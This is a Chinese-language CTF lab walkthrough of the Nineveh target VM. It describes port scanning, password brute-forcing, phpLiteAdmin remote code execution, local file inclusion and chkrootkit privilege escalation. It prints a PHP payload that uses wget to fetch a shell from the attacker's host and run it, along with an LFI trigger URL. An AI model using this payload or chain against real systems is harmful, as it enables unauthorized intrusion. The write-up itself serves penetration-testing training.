# 渗透测试实战-Nineveh靶机测试

阅读量 **513517**

|评论 **29**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-04-12 15:14:18

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t014bfc16c5b7cad282.jpg)

## # 前言

该靶机原本是某个在线CTF平台的解题靶机，国外大神不知使用什么姿势把OVA发布在了某平台上，被本菜下载来了。通过介绍得知本靶机以拿到
**/root/root.txt** 文件为完成。

## 准备环境

VirtualBox 192.168.1.51  
kali linux 192.168.1.101  
ova靶机下载地址： <https://pan.baidu.com/s/1mD5a3AIFRJ-JmTleu0W0qg>  
**注：本机系统内已默认写入IP“192.168.0.105”，如有需要就自行修改IP** （本菜是修改了IP）  

## 实操

神器nmap开路  

发现只开放了80、443
2个端口，我们访问443端口，老规矩看证书，里面肯定有包含特殊信息：“[admin@nineveh.htb](mailto:admin@nineveh.htb)”，如图：  
  
通过证书，只有一张图片，那我们进行用爆破工具跑一下，如御剑等等，本菜用dirb  
  
访问/db/ 发现使用phpliteadmin v1.9 这么明显标示的肯定是有问题的，不用怀疑google搜一波,发现存在远程命令执行漏洞  
  
根据要求我们需要创建一个数据库，那么前提就算破解这个密码了，上burp,加载上字典这波操作过于简单，小弟就不放图浪费大佬们时间了，得到密码为：
**password123**

登录成功后按照漏洞资料上的操作,先创建一个名为“ninevehNotes1.php”的数据库（为什么要用这个名字纳，后面会提到！）
表名处随便添，在最后执行语句中可以添加自己常用的马，本菜使用msf的php马，如<?php system(“wget
<http://192.168.1.101/shell.txt> -O /tmp/shell11.php; php /tmp/shell11.php”);
?>  
  
一切准备就绪，我们还差一个能触发的点，我们继续回到80端口，还是一样开启神器爆破目录  
  
发现目录访问 <http://192.168.1.51/department/> 简单测试知道帐号为admin（标示明显）  
  
密码进行挂上字典爆破 **得到密码： 1q2w3e4r5t**  
  
登录在<http://192.168.1.51/department/manage.php?notes=files/ninevehNotes.txt>
是一个简单任意文件读取，但是这里的读取文件是被写入白名单里的，就是它只能读取结尾带‘ninevehNotes’的文件，测试如图：  
  
  
我们用这个配合上前面的漏洞执行拿shell  
POC：  
**<http://192.168.1.51/department/manage.php?notes=/var/tmp/ninevehNotes1.php>**  
  
但是这个权限还算不够的，我们只能通过提权做进一步操作。大家肯定都直接想到脏牛提权了，但是本靶机没有这个漏洞，本菜在进行磁盘查看的时候，发现一个叫“/report”的文件夹，通过查看里面的文件发现是一个rootkit检测工具的实时报告文件，如图  
  
本菜使用比较笨的方法，就是把所知道的关于rookit的检测工具都进行全盘搜索，最后定位到使用了“chkrootkit”，  
  
通过查看其版本号和配置信息结合google搜索，发现一个本地提权漏洞，而MSF也已经有该利用脚本，如图：  

通过该漏洞最终拿下来root权限并得到flag：  

本靶机还可以通过获取ssh key 来提权，ssh key写在一个名叫“nineveh.png”图片内，如图：  
  
有兴趣的小伙伴可以自己研究一下。

**如果哪里写的不对，望清各位大佬斧正！感谢各位观看！**

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **d3ckx1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/104336](/post/id/104336)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [安全漏洞](/tag/安全漏洞)
  * [实战靶机攻击](/tag/实战靶机攻击)

 **+1** __13赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t017a53cae377f0cd5e.jpg) d3ckx1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

